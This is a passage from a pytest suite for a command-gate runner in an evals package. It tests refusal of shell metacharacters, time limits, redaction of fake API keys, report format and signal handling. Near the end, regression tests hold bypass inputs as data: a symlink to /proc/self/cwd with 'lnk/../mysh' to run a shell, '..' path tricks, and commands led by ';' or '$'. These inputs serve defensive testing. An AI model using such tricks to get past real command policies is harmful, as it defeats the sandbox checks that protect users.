    assert [r.id for r in report.gates] == [g.id for g in gates]


def test_two_refused_gates_are_both_reported(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    report = run(tmp_path, [G("a", command="x; y"), P("pass", id="b"), G("c", command="'")])
    assert statuses(report) == ["policy-error", "not-run", "policy-error"]
    assert report.gates[0].message != report.gates[2].message and spy.calls == []


def test_refused_gates_never_run_even_if_the_flag_is_on(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    report = run(tmp_path, [G(command="a; b", shell=False)], allow_shell=True)
    assert statuses(report) == ["policy-error"] and spy.calls == []


# --- time bounds -------------------------------------------------------------------------


def test_total_budget_spent_means_not_run_never_pass(tmp_path: Path, spy: Spy) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("pass", id="b")], total_s=0)
    assert statuses(report) == ["not-run", "not-run"] and spy.calls == []
    assert not report.ok and exit_code(report) == 1


def test_total_budget_caps_the_running_gate_and_skips_the_rest(tmp_path: Path) -> None:
    start = time.monotonic()
    gates = [P("import time; time.sleep(8)", id="slow", timeout_s=30), P("pass", id="after")]
    report = run(tmp_path, gates, total_s=1.0)
    assert statuses(report) == ["timeout", "not-run"]
    assert time.monotonic() - start < 6
    assert report.gates[0].message == "timed out after 1s" or report.gates[0].message.startswith(
        "timed out after 0."
    )
    assert exit_code(report) == 1


def test_a_generous_budget_changes_nothing(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("pass", id="b")], total_s=60)
    assert report.ok


def test_per_gate_timeout_is_the_smaller_of_gate_and_remaining(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import time; time.sleep(8)", timeout_s=0.5)], total_s=60)
    assert statuses(report) == ["timeout"] and report.gates[0].message == "timed out after 0.5s"


# --- output capture, redaction, truncation -----------------------------------------------


def test_tails_are_redacted(tmp_path: Path) -> None:
    code = f"import sys; print({ANT!r}); print({ANT!r}, file=sys.stderr); sys.exit(1)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert (
        "[REDACTED:anthropic-key]" in r.stdout_tail and "[REDACTED:anthropic-key]" in r.stderr_tail
    )
    assert "FAKE0" not in r.stdout_tail + r.stderr_tail


def test_redaction_happens_before_the_tail_is_cut(tmp_path: Path) -> None:
    code = f"import sys; sys.stdout.write('y' * 100 + '\\n' + {ANT!r} + '\\n' + 'z' * 3989)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert "FAKE0" not in r.stdout_tail and r.truncated and len(r.stdout_tail) == 4000


@pytest.mark.parametrize(("n", "cut"), [(3999, False), (4000, False), (4001, True), (4002, True)])
def test_tail_boundary(tmp_path: Path, n: int, cut: bool) -> None:
    r = run(tmp_path, [P(f"import sys; sys.stdout.write('x' * {n} )")]).gates[0]
    assert r.truncated is cut and len(r.stdout_tail) == min(n, 4000)


def test_stderr_tail_is_cut_too(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stderr.write('e' * 4001)")]).gates[0]
    assert r.truncated and len(r.stderr_tail) == 4000 and r.stdout_tail == ""


def test_huge_output_is_bounded(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.write('x' * 3_000_000); sys.stderr.write('e' * 1_000_000)"
    start = time.monotonic()
    r = run(tmp_path, [P(code)]).gates[0]
    assert r.status == "pass" and len(r.stdout_tail) == 4000 and len(r.stderr_tail) == 4000
    assert r.truncated and time.monotonic() - start < 30


def test_capture_truncation_counts_even_when_redaction_shrinks_the_text(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.write('y' * 5000 + '\\n' + 'sk-' + 'A1' * 31_500)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert r.truncated and "A1A1" not in r.stdout_tail and "[REDACTED:openai-key]" in r.stdout_tail
    assert len(r.stdout_tail) < 4000


def test_short_output_is_kept_whole_and_not_truncated(tmp_path: Path) -> None:
    r = run(tmp_path, [P("print('A' * 100)")]).gates[0]
    assert r.stdout_tail == "A" * 100 + "\n" and r.truncated is False


def test_invalid_utf8_output_does_not_crash(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stdout.buffer.write(b'a\\xff\\xfeb')")]).gates[0]
    assert r.status == "pass" and r.stdout_tail == "a\ufffd\ufffdb"
    json.dumps(gm.asdict(run(tmp_path, [P("pass")])))


# --- report schema and the CLI ------------------------------------------------------------


def test_report_schema_and_key_order(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "print('needle-in-argv')"]}))
    assert main([str(gf), "--root", str(tmp_path)]) == 0
    out = json.loads(capsys.readouterr().out)
    assert list(out) == ["schema_version", "kind", "gates", "passed", "failed", "total", "ok"]
    assert out["schema_version"] == 1 and out["kind"] == "gates" and out["ok"] is True
    assert list(out["gates"][0]) == [
        "id", "status", "exit_code", "duration_s", "stdout_tail", "stderr_tail", "truncated", "message",
    ]  # fmt: skip
    row = out["gates"][0]
    assert row["id"] == "a" and row["status"] == "pass" and row["exit_code"] == 0
    assert isinstance(row["duration_s"], float) and row["stdout_tail"] == "needle-in-argv\n"
    dumped = json.dumps({k: v for k, v in out.items() if k != "gates"})
    assert "needle" not in dumped and "command" not in out["gates"][0]


def test_the_report_never_contains_the_command_or_the_env(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("GATETEST_API_KEY", "zq-env-secret-value")
    gf = write(
        tmp_path, doc({"id": "a", "argv": [PY, "-c", "import sys; sys.exit(4)", "needle-arg"]})
    )
    assert main([str(gf), "--root", str(tmp_path)]) == 1
    text = capsys.readouterr().out
    assert "needle-arg" not in text and "zq-env-secret-value" not in text and PY not in text


def test_policy_error_report_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy
) -> None:
    spy.block = True
    gf = write(tmp_path, doc({"id": "a", "command": "pytest -q"}, {"id": "b", "command": "x | y"}))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    out = json.loads(capsys.readouterr().out)
    assert [g["status"] for g in out["gates"]] == ["not-run", "policy-error"] and out["ok"] is False
    assert spy.calls == []


def test_cli_exit_codes_with_real_processes(tmp_path: Path) -> None:
    ok = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    proc = cli(str(ok), cwd=tmp_path)
    assert proc.returncode == 0 and json.loads(proc.stdout)["ok"] is True
    bad = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "raise SystemExit(5)"]}))
    proc = cli(str(bad), cwd=tmp_path)
    assert proc.returncode == 1 and json.loads(proc.stdout)["gates"][0]["exit_code"] == 5
    refused = write(tmp_path, doc({"id": "a", "command": "x; y"}))
    proc = cli(str(refused), cwd=tmp_path)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    unusable = write_raw(tmp_path, b"{")
    proc = cli(str(unusable), cwd=tmp_path)
    assert proc.returncode == 2 and proc.stdout.startswith("Gate file: ")


@pytest.mark.parametrize("unbuffered", [False, True], ids=["buffered", "unbuffered"])
def test_cli_default_root_is_the_current_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, unbuffered: bool
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import os; print(os.getcwd())"]}))
    if unbuffered:
        monkeypatch.setenv("PYTHONUNBUFFERED", "1")
    else:
        monkeypatch.delenv("PYTHONUNBUFFERED", raising=False)
    proc = cli(str(gf), cwd=tmp_path)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["gates"][0]["stdout_tail"] == str(tmp_path.resolve()) + "\n"


def test_cli_root_flag_sets_the_default_cwd(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    (tmp_path / "root").mkdir()
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import os; print(os.getcwd())"]}))
    assert main([str(gf), "--root", str(tmp_path / "root")]) == 0
    row = json.loads(capsys.readouterr().out)["gates"][0]
    assert row["stdout_tail"] == str((tmp_path / "root").resolve()) + "\n"


def test_cli_root_flag_fences_the_gates(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    (tmp_path / "root").mkdir()
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"], "cwd": ".."}))
    assert main([str(gf), "--root", str(tmp_path / "root")]) == 2
    assert "cwd refused" in capsys.readouterr().out


@pytest.mark.parametrize("which", ["missing", "file"])
def test_cli_bad_root_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, which: str
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    (tmp_path / "f").write_text("x")
    root = tmp_path / ("nope" if which == "missing" else "f")
    assert main([str(gf), "--root", str(root)]) == 2
    out = capsys.readouterr().out
    assert str(tmp_path) not in out and ("does not exist" in out or "not a folder" in out)


def test_cli_allow_shell_flag(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "command": "echo hi && echo there", "shell": True}))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    capsys.readouterr()
    assert main([str(gf), "--root", str(tmp_path), "--allow-shell"]) == 0
    assert json.loads(capsys.readouterr().out)["gates"][0]["stdout_tail"] == "hi\nthere\n"


@pytest.mark.parametrize(
    "args", [[], ["a.json", "b.json"], ["a.json", "--baseline", "x"], ["--help-me"]]
)
def test_cli_bad_arguments_exit_2(args: list[str]) -> None:
    with pytest.raises(SystemExit) as exc:
        main(args)
    assert exc.value.code == 2


def test_unexpected_error_is_exit_2_and_never_echoes_the_text(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise RuntimeError("synthetic-text")

    monkeypatch.setattr(gm, "run_gates", boom)
    gf = write(tmp_path, doc(OK))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    out = capsys.readouterr().out
    assert out.strip() == "Gates could not run (RuntimeError)."


class BadStdout:
    def __init__(self, exc: BaseException, on: str) -> None:
        self.exc, self.on = exc, on

    def write(self, text: str) -> int:
        if self.on == "write":
            raise self.exc
        return len(text)

    def flush(self) -> None:
        if self.on == "flush":
            raise self.exc


def main_lost(argv: list[str]) -> int:
    """main() with a broken stdout; closes the devnull handle it parks there (no ResourceWarning)."""
    code = main(argv)
    parked = sys.stdout
    if parked is not None and not isinstance(parked, BadStdout):
        parked.close()
    return code


@pytest.mark.parametrize("on", ["write", "flush"])
@pytest.mark.parametrize("outcome", ["pass", "fail", "refused", "unusable"])
def test_a_lost_report_is_exit_2(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, on: str, outcome: str
) -> None:
    rows = {
        "pass": doc({"id": "a", "argv": [PY, "-c", "pass"]}),
        "fail": doc({"id": "a", "argv": [PY, "-c", "raise SystemExit(1)"]}),
        "refused": doc({"id": "a", "command": "x; y"}),
        "unusable": doc(),
    }
    gf = write(tmp_path, rows[outcome])
    monkeypatch.setattr(sys, "stdout", BadStdout(OSError(28, "No space left on device"), on))
    assert main_lost([str(gf), "--root", str(tmp_path)]) == 2


def test_closed_stdout_is_exit_2(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    monkeypatch.setattr(sys, "stdout", None)
    assert main_lost([str(gf), "--root", str(tmp_path)]) == 2


def test_keyboard_interrupt_while_writing_the_report_propagates(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    monkeypatch.setattr(sys, "stdout", BadStdout(KeyboardInterrupt(), "write"))
    with pytest.raises(KeyboardInterrupt):
        main([str(gf), "--root", str(tmp_path)])


@pytest.mark.skipif(not os.path.exists("/dev/full"), reason="needs /dev/full")
def test_full_disk_buffered_stdout_is_exit_2(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    with open("/dev/full", "w") as full:
        code = subprocess.run(
            [PY, "-m", "master_finhub.evals.gates", str(gf)],
            stdout=full, stderr=subprocess.DEVNULL, env=env, cwd=tmp_path, check=False, timeout=60,
        ).returncode  # fmt: skip
    assert code == 2


# --- exit-code mapping, determinism, bounds ----------------------------------------------


def result(status: Any) -> GateResult:
    return GateResult("a", status, None, 0.0, "", "", False, "")


@pytest.mark.parametrize(
    ("statuses_in", "want"),
    [
        (["pass"], 0),
        (["pass", "pass", "pass"], 0),
        (["fail"], 1),
        (["timeout"], 1),
        (["error"], 1),
        (["not-run"], 1),
        (["pass", "fail"], 1),
        (["pass", "not-run"], 1),
        (["policy-error"], 2),
        (["not-run", "policy-error"], 2),
        (["pass", "fail", "policy-error"], 2),
        ([], 1),
    ],
)
def test_status_to_exit_code(statuses_in: list[str], want: int) -> None:
    assert exit_code(gm._report([result(s) for s in statuses_in])) == want


def test_report_counts_only_passes(tmp_path: Path) -> None:
    rep = gm._report([result(s) for s in ("pass", "fail", "timeout", "error", "not-run", "pass")])
    assert (rep.passed, rep.failed, rep.total, rep.ok) == (2, 4, 6, False)


def test_same_file_same_report_apart_from_durations(tmp_path: Path) -> None:
    gates = [P(f"print({i})", id=f"g{i}") for i in range(4)] + [P("raise SystemExit(2)", id="x")]

    def norm() -> list[Any]:
        rep = gm.asdict(run(tmp_path, gates))
        return [{k: v for k, v in g.items() if k != "duration_s"} for g in rep["gates"]]

    assert norm() == norm()


def test_declared_order_is_kept_not_sorted(tmp_path: Path) -> None:
    ids = ["zz", "b", "Z", "a1", "0"]
    report = run(tmp_path, [P("pass", id=i) for i in ids])
    assert [r.id for r in report.gates] == ids
    assert [
        g.id
        for g in load_gate_file(write(tmp_path, doc(*({"id": i, "command": "x"} for i in ids))))
    ] == ids


@pytest.mark.parametrize(
    "shape",
    [
        "a" * 4096,
        "'" * 4095,
        '"' * 4095,
        "\\" * 4095,
        "$(" * 2000,
        " " * 4000 + "x",
        "a " * 2040,
        "a'" * 2040,
        "~/" * 2000,
        "-" * 4096,
        "a=" * 2000,
    ],
)
def test_pathological_commands_are_fast(tmp_path: Path, shape: str) -> None:
    start = time.monotonic()
    got = plan(tmp_path, command=shape)
    assert time.monotonic() - start < 2 and (isinstance(got, (str, Plan)))


@pytest.mark.parametrize("size", [200_000, 1_000_000])
def test_oversized_commands_are_refused_without_parsing(tmp_path: Path, size: int) -> None:
    start = time.monotonic()
    assert plan(tmp_path, command="a " * (size // 2)) == "command is too long"
    assert plan(tmp_path, argv=("echo", "a" * size)) == "argv is too long"
    assert (
        plan(tmp_path, command="echo " + "a" * size, shell=True, allow_shell=True)
        == "command is too long"
    )
    assert time.monotonic() - start < 2


def test_the_module_has_no_regex() -> None:
    assert not hasattr(gm, "re")  # nothing here needs a ReDoS review


def test_runner_contract_is_untouched() -> None:
    assert runner.BUCKETS == ("regressed", "removed", "fixed", "still_failing", "unchanged", "new")
    assert not hasattr(runner, "load_gate_file") and "gates" not in runner.main.__code__.co_varnames


# --- boundaries that need a fake clock, a fake file or an exact byte count -----------------


def test_bad_gate_is_numbered_from_one(tmp_path: Path) -> None:
    p = write(tmp_path, doc(OK, {"id": "b"}))
    with pytest.raises(GateFileError, match="gate 2 "):
        load_gate_file(p)


def test_the_file_read_is_bounded(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    sizes: list[int] = []
    real_open = open

    class ReadSpy:
        def __init__(self, fh: Any) -> None:
            self.fh = fh

        def __enter__(self) -> Self:
            return self

        def __exit__(self, *a: object) -> None:
            self.fh.close()

        def read(self, n: int = -1) -> bytes:
            sizes.append(n)
            return bytes(self.fh.read(n))

    monkeypatch.setattr("builtins.open", lambda *a, **k: ReadSpy(real_open(*a, **k)))
    load_gate_file(write(tmp_path, doc(OK)))
    assert sizes == [gm.MAX_FILE_BYTES + 1]


def test_timeout_values_that_are_not_finite_positive_numbers() -> None:
    for bad in (float("nan"), float("inf"), float("-inf"), 0, 0.0, -1, True, False, "5", None):
        assert gm._timeout(bad) is None
    assert gm._timeout(1) == 1.0 and gm._timeout(1800) == 1800.0


def test_the_tail_is_the_end_of_the_output(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stdout.write('HEAD' + 'x' * 5000 + 'END')")]).gates[0]
    assert r.stdout_tail.endswith("xxxEND") and "HEAD" not in r.stdout_tail


def test_the_capture_window_is_exactly_64000_bytes(tmp_path: Path) -> None:
    # One 63,003-character secret, so the redacted tail is short and only the capture cut can
    # set the flag: 64,000 bytes in total fits the window, 64,001 does not.
    def code(prefix: int) -> str:
        return f"import sys; sys.stdout.write('y' * {prefix} + '\\n' + 'sk-' + 'A1' * 31_500)"

    fits = run(tmp_path, [P(code(996))]).gates[0]
    cut = run(tmp_path, [P(code(997))]).gates[0]
    assert "[REDACTED:openai-key]" in fits.stdout_tail and fits.truncated is False
    assert "[REDACTED:openai-key]" in cut.stdout_tail and cut.truncated is True


def test_total_budget_boundary_with_a_frozen_clock(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    spy.block = True
    monkeypatch.setattr(gm, "time", types.SimpleNamespace(monotonic=lambda: 100.0))
    report = run(tmp_path, [P("pass")], total_s=0)  # remaining is exactly 0: spent
    assert statuses(report) == ["not-run"] and spy.calls == []


def test_durations_are_small_non_negative_numbers(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass"), P("import time; time.sleep(0.2)", id="b")])
    first, second = (g.duration_s for g in report.gates)
    assert 0 <= first < 5 and 0.15 <= second < 5


def test_the_documented_bounds() -> None:
    assert (gm.MAX_GATES, gm.MAX_FILE_BYTES, gm.MAX_TEXT_CHARS, gm.MAX_ARGV_ITEMS) == (
        50, 262_144, 4096, 256,
    )  # fmt: skip
    assert (gm.DEFAULT_TIMEOUT_S, gm.MAX_TIMEOUT_S, gm.MAX_TOTAL_S) == (300.0, 1800.0, 3600.0)
    assert (gm.TAIL_CHARS, gm.SHELL_PATH, gm.SCHEMA_VERSION) == (4000, "/bin/sh", 1)
    assert gm.SHELL_METACHARS == frozenset(";&|`$<>\n\r")
    assert gm.ROOT_KEYS == {"schema_version", "gates"}
    assert gm.GATE_KEYS == {"id", "command", "argv", "shell", "timeout_s", "cwd"}


def test_non_ascii_output_survives_an_ascii_stdout(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.buffer.write('caf\\u00e9'.encode())"
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", code]}))
    proc = cli(str(gf), cwd=tmp_path, PYTHONIOENCODING="ascii")
    assert proc.returncode == 0 and "caf\\u00e9" in proc.stdout and proc.stdout.isascii()
    assert json.loads(proc.stdout)["gates"][0]["stdout_tail"] == "caf\u00e9"


def test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set(tmp_path: Path) -> None:
    code = "import os; print(os.getcwd())"
    env = {"PATH": os.environ["PATH"]}
    here = collect(stream_process([PY, "-c", code], env=env, timeout_s=20))
    there = collect(stream_process([PY, "-c", code], env=env, timeout_s=20, cwd=str(tmp_path)))
    assert here.stdout == os.getcwd() + "\n"
    assert there.stdout == str(tmp_path.resolve()) + "\n"


# --- signals sent to the runner itself ---------------------------------------------------------


def _gone(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return True
    return False


# The runner child must not inherit this process's signal dispositions: a suite started as a
# background job or under nohup has SIGINT or SIGHUP ignored, and an ignored signal is inherited
# across exec. This boot line restores Python's SIGINT handler (SIG_DFL would kill without unwinding) (thread-safe, unlike
# preexec_fn); the runner itself installs its own SIGTERM and SIGHUP handlers.
BOOT = (
    "import runpy, signal, sys; signal.signal(signal.SIGINT, signal.default_int_handler); "
    "sys.argv = ['gates'] + sys.argv[1:]; runpy.run_module('master_finhub.evals.gates', run_name='__main__')"
)
SIG_CODES = {signal.SIGINT: (-2, 130), signal.SIGTERM: (143,), signal.SIGHUP: (129,)}


@pytest.mark.parametrize(
    "sig", [signal.SIGINT, signal.SIGTERM, signal.SIGHUP], ids=lambda s: s.name
)
def test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass(
    tmp_path: Path, sig: signal.Signals
) -> None:
    ready = tmp_path / "pid"
    child = "import os, sys, time, pathlib; pathlib.Path(sys.argv[1]).write_text(str(os.getpid())); time.sleep(60)"
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", child, str(ready)], "timeout_s": 120}))
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    proc = subprocess.Popen(
        [PY, "-c", BOOT, str(gf)],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, env=env, cwd=tmp_path,
    )  # fmt: skip
    try:
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline and not (ready.exists() and ready.read_text()):
            time.sleep(0.05)
        pid = int(ready.read_text())
        proc.send_signal(sig)
        out, _ = proc.communicate(timeout=30)
    finally:
        if proc.poll() is None:
            proc.kill()
    time.sleep(0.5)
    gone = _gone(pid)
    if not gone:
        os.kill(pid, signal.SIGKILL)  # never leave a runaway behind, whatever the verdict
    assert gone and out == b"" and proc.returncode not in (0, 1, 2)
    assert proc.returncode in SIG_CODES[sig]


@pytest.mark.parametrize("sig", [signal.SIGTERM, signal.SIGHUP], ids=lambda s: s.name)
def test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sig: signal.Signals
) -> None:
    def sentinel(signum: int, frame: Any) -> None:
        pass

    seen: list[Any] = []

    def probe(*a: Any, **k: Any) -> Any:
        handler = signal.getsignal(sig)
        seen.append(handler)
        assert callable(handler) and handler is not sentinel
        handler(sig, None)  # what the kernel would do on delivery

    monkeypatch.setattr(gm, "run_gates", probe)
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    before = signal.signal(sig, sentinel)
    try:
        with pytest.raises(SystemExit) as exc:
            main([str(gf), "--root", str(tmp_path)])
        assert exc.value.code == 128 + sig and len(seen) == 1
        assert signal.getsignal(sig) is sentinel
    finally:
        signal.signal(sig, before)


def test_the_handlers_are_left_alone_off_the_main_thread() -> None:
    import threading

    def sentinel(signum: int, frame: Any) -> None:
        pass

    box: list[Any] = []

    def work() -> None:
        with gm._signals_raise():
            box.append([signal.getsignal(s) for s in gm.HANDLED_SIGNALS])

    before = {s: signal.signal(s, sentinel) for s in gm.HANDLED_SIGNALS}
    try:
        t = threading.Thread(target=work)
        t.start()
        t.join(10)
        assert box == [[sentinel, sentinel]]
        assert all(signal.getsignal(s) is sentinel for s in gm.HANDLED_SIGNALS)
    finally:
        for s, h in before.items():
            signal.signal(s, h)


def test_a_handler_installed_from_c_is_restored_to_the_default(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[tuple[Any, Any]] = []

    def fake(sig: Any, handler: Any) -> Any:
        calls.append((sig, handler))
        return None  # what signal.signal returns for a handler installed from C

    monkeypatch.setattr(gm.signal, "signal", fake)
    with gm._signals_raise():
        pass
    assert [c[1] for c in calls[:2]] == [gm._raise_exit, gm._raise_exit]
    assert calls[2:] == [(s, signal.SIG_DFL) for s in gm.HANDLED_SIGNALS]


# --- the resolution-mismatch matrix, real CLI (round 3c): tests/gate_matrix.py -----------------


def _matrix(only: str) -> list[Any]:
    rows = gate_matrix.ROWS
    if only == "refused":
        return [r for r in rows if "limit" not in r[5]]
    if only == "core":
        return [r for r in rows if "limit" not in r[5] and r[5].get("core")]
    return [r for r in rows if "limit" in r[5]]


@pytest.mark.parametrize("row", _matrix("refused"), ids=lambda r: r[0])
def test_matrix_every_row_is_refused_with_the_runner_in_another_folder(row: Any) -> None:
    """M1: runner cwd B/a/b, --root B. Exit 2, policy-error, nothing spawned, no MARK."""
    verdict, note = gate_matrix.run_row(row, "M1", SRC, PY)
    assert verdict == "refused", (row[1], note)


@pytest.mark.parametrize("mode", ["M2", "M3"])
@pytest.mark.parametrize("row", _matrix("core"), ids=lambda r: r[0])
def test_matrix_core_rows_are_refused_in_every_runner_placement(row: Any, mode: str) -> None:
    """M2: runner cwd = the gate's cwd. M3: --root elsewhere (B/sub), default gate cwd."""
    verdict, note = gate_matrix.run_row(row, mode, SRC, PY)
    assert verdict in ("refused", "n/a"), (row[1], note)


@pytest.mark.parametrize("row", _matrix("limit"), ids=lambda r: r[0])
def test_matrix_documented_limits_really_run_the_marker(row: Any) -> None:
    """Pinned so the documentation cannot go stale: these are NOT detected, and the child runs it."""
    verdict, note = gate_matrix.run_row(row, "M1", SRC, PY)
    assert verdict == "MARK", (row[1], note)


def test_the_d1_repro_exactly_as_qa_reported_it(tmp_path: Path) -> None:
    """A `..` after a link to /proc/self/cwd: gate folder `sub` holds lnk -> /proc/self/cwd, its parent
    holds mysh -> a shell; runner in D/a/b, --root D. Before the fix the child ran the shell."""
    (tmp_path / "sub").mkdir()
    (tmp_path / "a" / "b").mkdir(parents=True)
    fake = tmp_path / "bin" / "bash"
    fake.parent.mkdir()
    fake.write_text(gate_matrix.FAKE)
    fake.chmod(0o755)
    (tmp_path / "sub" / "lnk").symlink_to("/proc/self/cwd")
    (tmp_path / "mysh").symlink_to("bin/bash")
    gf = write(
        tmp_path, doc({"id": "a", "argv": ["lnk/../mysh", "-c", "touch MARK"], "cwd": "sub"})
    )
    proc = cli(str(gf), "--root", str(tmp_path), cwd=tmp_path / "a" / "b")
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert "'..'" in json.loads(proc.stdout)["gates"][0]["message"]
    assert not list(tmp_path.rglob("MARK"))


@pytest.mark.parametrize(
    "word", ["../x", "a/../b", "./a/..", "..", "x/..", "/usr/../bin/tool", "d/../d"]
)
def test_any_dotdot_component_in_the_executable_is_refused_before_any_normalisation(
    tmp_path: Path, word: str
) -> None:
    """The cost of the root-cause rule: even a harmless `..` is refused (use the path without it)."""
    got = plan(tmp_path, argv=(word, "-c", "x"))
    assert isinstance(got, str) and "'..'" in got and word not in got.replace("'..'", "")


def test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_not_in_one_after_the_hit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "d1").mkdir()
    tool = tmp_path / "d1" / "mytool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path / 'd1'}:{tmp_path}/x/..")  # the hit is found first: fine
    assert isinstance(plan(tmp_path, argv=("mytool",)), Plan)
    monkeypatch.setenv(
        "PATH", f"{tmp_path}/x/..:{tmp_path / 'd1'}"
    )  # reached before the hit: refused
    got = plan(tmp_path, argv=("mytool",))
    assert isinstance(got, str) and "'..'" in got


def test_arguments_and_python_bodies_and_declared_shell_gates_keep_their_dotdot(
    tmp_path: Path,
) -> None:
    assert isinstance(plan(tmp_path, argv=("python", "-c", "import os; os.listdir('..')")), Plan)
    assert isinstance(plan(tmp_path, argv=("cat", "../x", "a/../b")), Plan)
    got = plan(tmp_path, command="cat ../x | wc", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "mysh").symlink_to("bin/bash")

    def boom(path: Any) -> str:
        raise OSError(13, "denied")

    monkeypatch.setattr(gm.os, "readlink", boom)
    got = plan(tmp_path, argv=("./mysh", "-c", "x"))
    assert isinstance(got, str) and "could not be examined" in got


def test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them(
    tmp_path: Path,
) -> None:
    """Pinned behaviour (QA Q25): /developer/x and /procfs/x are NOT under /dev or /proc."""
    for word in ["/developer/tool", "/devices/x", "/procfs/x", "/process/x", "/devx"]:
        got = plan(tmp_path, argv=(word,))
        assert not (isinstance(got, str) and "/proc or /dev" in got), word
    for word in [
        "/dev",
        "/proc",
        "/dev/null",
        "//dev/null",
        "//proc/self/cwd/x",
        "/dev//null",
        "/./dev/null",
    ]:
        got = plan(tmp_path, argv=(word,))
        assert isinstance(got, str) and "/proc or /dev" in got, word


@pytest.mark.parametrize("ch", list(";&|`$<>"), ids=lambda c: repr(c))
def test_a_metacharacter_as_the_first_character_is_refused_too(tmp_path: Path, ch: str) -> None:
    """QA Q42: the scan must cover index 0 (`;true`, `$HOME/x`, `|x`). A leading newline or carriage
    return is stripped with the other outer whitespace, so it is not a first character."""
    got = plan(tmp_path, command=f"{ch}true")
    assert isinstance(got, str) and "metacharacters" in got


def test_a_relative_link_target_is_resolved_from_the_links_own_folder(tmp_path: Path) -> None:
    """l -> proc/tool means <folder of l>/proc/tool, not /proc/tool: a harmless tool is accepted."""
    (tmp_path / "proc").mkdir()
    tool = tmp_path / "proc" / "tool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    (tmp_path / "l").symlink_to("proc/tool")
    assert isinstance(plan(tmp_path, argv=("./l",)), Plan)
    (tmp_path / "m").symlink_to(
        "proc/self/cwd"
    )  # no such folder here: nothing under /proc is entered
    assert isinstance(plan(tmp_path, argv=("./m/tool",)), Plan)


def test_a_dotdot_inside_a_link_target_is_applied_to_the_folder_reached_so_far(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The word has no `..`, but a link's target may: it is walked physically (the parent of the folder
    reached, links already resolved), so `lnk/../mysh` inside a target cannot hide a link to /proc.
    """
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    run_dir.mkdir()
    sub.mkdir()
    (sub / "lnk").symlink_to("/proc/self/cwd")
    (sub / "m2").symlink_to("lnk/../mysh")
